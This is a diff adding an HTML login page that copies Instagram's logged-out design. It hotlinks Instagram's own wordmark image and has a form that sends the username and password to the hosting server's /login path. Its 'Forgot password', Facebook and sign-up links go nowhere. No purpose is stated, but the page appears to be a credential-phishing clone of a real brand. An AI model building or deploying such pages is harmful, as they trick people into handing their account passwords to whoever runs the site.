@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Log In</title>
+<style>
+  :root{
+    --bg:#fafafa;
+    --card-border:#dbdbdb;
+    --input-bg:#fafafa;
+    --muted:#8e8e8e;
+    --link-blue:#0095f6;
+    --link-dark:#00376b;
+    --btn-bg:#0095f6;
+    --text:#262626;
+    --card-width:350px;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    background:var(--bg);
+    display:flex;align-items:center;justify-content:center;
+    min-height:100vh;padding:24px;color:var(--text);
+  }
+  .stage{width:100%;max-width:980px;display:flex;gap:48px;align-items:center;justify-content:center}
+  .phone-side{flex:1;display:flex;justify-content:center;align-items:center}
+  .phone-mock{width:380px;height:640px;background:#eee;border-radius:18px}
+  .right-col{flex:0 0 var(--card-width);display:flex;flex-direction:column;gap:12px;align-items:center}
+  .card{width:100%;background:#fff;border:1px solid var(--card-border);padding:40px 40px 16px;display:flex;flex-direction:column;align-items:center}
+  .logo{width:175px;margin-bottom:22px}
+  .form-group{width:100%}
+  input{width:100%;height:44px;padding:9px 8px;font-size:14px;background:var(--input-bg);border:1px solid var(--card-border);border-radius:4px;margin-bottom:8px}
+  input:focus{outline:none;border-color:#a8a8a8}
+  .login-btn{width:100%;height:38px;margin-top:6px;background:var(--btn-bg);border:none;color:#fff;border-radius:4px;font-weight:600;font-size:14px;cursor:pointer}
+  .login-btn:disabled{opacity:0.4;cursor:default}
+  .or-row{display:flex;align-items:center;gap:10px;width:100%;margin:14px 0}
+  .or-row .line{flex:1;height:1px;background:#efefef}
+  .or-row .or{font-size:13px;color:var(--muted);font-weight:600;text-transform:uppercase}
+  .fb-login{font-size:14px;color:var(--link-dark);font-weight:600;text-decoration:none;display:flex;align-items:center;gap:8px;margin-top:6px}
+  .forgot{margin-top:14px;font-size:12px;color:var(--link-dark);text-decoration:none}
+  .signup-card{width:100%;background:#fff;border:1px solid var(--card-border);padding:16px 0;text-align:center;font-size:14px}
+  .signup-card a{color:var(--link-blue);font-weight:600;text-decoration:none}
+  .small-muted{color:var(--muted);font-size:12px;margin-top:12px}
+  @media (max-width:900px){.stage{flex-direction:column;gap:10px}.phone-side{display:none}.right-col{max-width:420px}.card{padding:34px 28px}}
+</style>
+</head>
+<body>
+  <div class="stage">
+    <div class="phone-side"><div class="phone-mock"></div></div>
+    <div class="right-col">
+      <div class="card">
+        <img class="logo" src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="logo">
+        <form style="width:100%" action="/login" method="POST">
+          <div class="form-group">
+            <input name="username" type="text" placeholder="Username" required>
+          </div>
+          <div class="form-group">
+            <input name="password" type="password" placeholder="Password" required>
+          </div>
+          <button class="login-btn" type="submit">Log In</button>
+          <div style="display:flex;justify-content:center">
+            <a class="forgot" href="#">Forgot password?</a>
+          </div>
+          <div class="or-row"><div class="line"></div><div class="or">OR</div><div class="line"></div></div>
+          <a class="fb-login" href="#">Log in with Facebook</a>
+        </form>
+      </div>
+      <div class="signup-card">Don't have an account? <a href="#">Sign up</a></div>
+      <div class="small-muted">Get the app.</div>
+    </div>
+  </div>
+</body>
+</html>
